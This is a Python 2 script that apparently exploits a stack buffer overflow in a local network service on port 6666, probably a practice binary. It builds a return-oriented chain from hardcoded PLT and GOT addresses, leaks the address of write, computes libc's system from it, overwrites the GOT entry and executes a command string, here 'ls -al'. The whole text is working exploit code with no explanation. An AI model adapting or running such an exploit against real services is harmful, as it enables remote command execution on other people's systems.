from struct import pack, unpack
from socket import *

p = lambda x: pack("<L", x)
up = lambda x: unpack("<L", x)[0]

write_plt = 0x804830c
write_got = 0x8049614
read_plt = 0x804832c
read_got = 0x804961c
offset = 0x99880 # read - system
pop3ret = 0x80484b6
dynamic = 0x8049530
binsh = "ls -al"

s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 6666))


payload = "A"*140
payload += p(write_plt)
payload += p(pop3ret)
payload += p(1)
payload += p(write_got)
payload += p(4)

# read to function write@got
payload += p(read_plt)
payload += p(pop3ret)
payload += p(0)
payload += p(write_got)
payload += p(4)

#read to buf command

payload += p(read_plt)
payload += p(pop3ret)
payload += p(0)
payload += p(dynamic)
payload += p(len(binsh))

# call system
payload += p(write_plt)
payload += p(0xdeadbeef)
payload += p(dynamic)

s.send(payload)

got = up(s.recv(4))
print "write got : " + hex(got)
libc_base = got - 0xd4230
print "libc_base : " + hex(libc_base)
system_plt = got - (0xd4230 - 0x3a940)
#print "%x"%(0xbf190 - 0x39450)
#system_plt = got - (0x217f50 - 0x1847e0)
print "system_plt : " + hex(system_plt)

s.send(p(system_plt))
s.send(binsh)
print s.recv(1024)
s.close()